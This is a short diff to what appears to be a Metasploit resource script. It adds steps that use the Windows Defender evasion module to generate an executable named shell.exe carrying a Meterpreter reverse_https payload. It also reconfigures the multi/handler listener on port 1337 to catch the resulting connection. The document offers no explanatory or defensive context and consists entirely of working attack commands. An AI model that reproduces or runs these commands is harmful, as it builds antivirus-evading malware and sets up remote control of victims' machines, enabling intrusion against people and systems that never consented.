@@ -1,2 +1,9 @@
+use evasion/windows/windows_defender_exe
+set payload windows/meterpreter/reverse_https
+set lport 1337
+set filename shell.exe
+run
 use multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_https
+set lport 1337
+exploit -j
